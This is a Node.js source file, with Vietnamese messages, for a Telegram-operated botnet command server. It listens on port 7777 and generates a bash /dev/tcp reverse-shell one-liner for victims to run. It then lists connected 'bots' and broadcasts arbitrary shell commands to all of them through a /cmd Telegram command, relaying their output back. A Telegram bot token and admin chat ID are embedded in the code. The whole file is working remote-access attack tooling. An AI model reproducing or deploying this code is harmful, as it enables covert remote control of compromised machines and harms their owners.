const net = require('net'), TelegramBot = require('node-telegram-bot-api'), https = require('https');
const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc', chatIdAdmin = 7371969470, bot = new TelegramBot(token, { polling: true });
const clients = new Map(), buffers = new Map(); let botCounter = 1;
function getIPv4(cb) { https.get('https://api.ipify.org?format=json', res => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { cb(JSON.parse(d).ip); } catch { cb('YOUR_PUBLIC_IP'); } }); }).on('error', () => cb('YOUR_PUBLIC_IP')); }
function sendSlaveCmd() { getIPv4(ip => { const cmd = `while true; do exec 3<>/dev/tcp/${ip}/7777; while read -r c <&3; do [[ -z "$c" ]] && continue; o=$(bash -c "$c" 2>&1); echo "$o" >&3; done; sleep 2; done`; bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng:\n\`\`\`bash\n${cmd}\n\`\`\``, { parse_mode: 'Markdown' }); }); }
function flush(s) { const c = clients.get(s), b = buffers.get(s); if (!c || !b?.data) return; bot.sendMessage(chatIdAdmin, `📡 Bot ${c.id} - ${c.ip}:${c.port}:\n\`\`\`\n${b.data.trim()}\n\`\`\``, { parse_mode: 'Markdown' }); buffers.set(s, { data: '', timeout: null }); }
function handleDisconnect(s) { const c = clients.get(s); if (!c) return; clients.delete(s); buffers.delete(s); bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: Bot ${c.id} - ${c.ip}:${c.port}`); }
const server = net.createServer(s => {
  s.setKeepAlive(true); const ip = s.remoteAddress.replace(/^.*:/, ''), port = s.remotePort, id = botCounter++;
  clients.set(s, { ip, port, id }); buffers.set(s, { data: '', timeout: null });
  bot.sendMessage(chatIdAdmin, `[+] Bot kết nối: Bot ${id} - ${ip}:${port}`);
  s.on('data', d => { const str = d.toString(), b = buffers.get(s); if (!b) return; b.data += str; if (b.timeout) clearTimeout(b.timeout); b.timeout = setTimeout(() => flush(s), 300); });
  s.on('error', () => handleDisconnect(s));
  s.on('close', () => handleDisconnect(s));
});
setInterval(() => { for (const s of clients.keys()) s.write('\n', e => { if (e) handleDisconnect(s); }); }, 100);
server.listen(7777, () => { console.log('[*] Server listening on port 7777'); sendSlaveCmd(); });
bot.onText(/^\/listbot$/, m => { if (m.chat.id !== chatIdAdmin) return; if (clients.size === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.'); bot.sendMessage(chatIdAdmin, `🤖 Có ${clients.size} bot đang kết nối:\n${[...clients.values()].map(c => `Bot ${c.id} - [${c.ip}:${c.port}]`).join('\n')}`); });
bot.onText(/^\/cmd (.+)/, (m, mt) => { if (m.chat.id !== chatIdAdmin) return; const cmd = mt[1].trim(); if (!cmd) return bot.sendMessage(chatIdAdmin, '❌ Nhập lệnh: `/cmd <lệnh>`', { parse_mode: 'Markdown' }); if (clients.size === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.'); for (const s of clients.keys()) try { s.write(cmd + '\n'); } catch {} bot.sendMessage(chatIdAdmin, `✅ Đã gửi lệnh đến ${clients.size} bot:\n\`${cmd}\``, { parse_mode: 'Markdown' }); });
